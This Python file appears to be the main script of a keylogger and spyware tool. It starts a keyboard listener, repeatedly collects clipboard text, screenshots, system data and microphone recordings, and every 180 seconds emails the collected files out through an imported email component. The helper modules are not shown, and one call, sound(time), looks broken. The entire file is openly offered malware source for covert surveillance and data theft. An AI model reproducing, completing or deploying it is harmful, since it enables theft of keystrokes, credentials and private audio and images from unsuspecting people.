#packages imports
from pynput.keyboard import Listener
import wave
import sys
from scipy.io.wavfile import write
import threading
import platform
import psutil
import GPUtil
import socket
import time, datetime
import asyncio
from cryptography.fernet import Fernet
import http.client as httplib

#modules imports
sys.path.insert(0, './components')
from components import clipboard, email, keyboard, screenshoot, sound, systemData



Time = datetime.datetime.now()
stoppingTime = Time + datetime.timedelta(seconds=180)

filePath: list = [
    "clipboard_file.txt",
    "system_Information_file.txt",
    "keyboard_file.txt",
    "screenshot.jpg",
    "soundrecord.wav"
]

# getting the system version and info




listener = Listener(on_press=keyboard.onPress, on_release=keyboard.onRelease(stoppingTime))
listener.start()





def final_func():
    global Time, stoppingTime
    if (datetime.datetime.now()) >= stoppingTime:
        print("working HERE")
        email.send_email(filePath)               
        Time = datetime.datetime.now()
        stoppingTime = Time + datetime.timedelta(seconds=180)
        print(Time, stoppingTime)

def setInterval(time):
    e = threading.Event()
    while not e.wait(time):
        if (datetime.datetime.now()) <= stoppingTime:
            count = str(datetime.datetime.now().timestamp()).split('.')[0]
            clipboard.clipboard_func()
            screenshoot.screenshot_func(count[8:10])
            systemData.system_Data()
            sound(time)
        else:
            final_func()
            setInterval(90)
            
setInterval(90)
print("working")
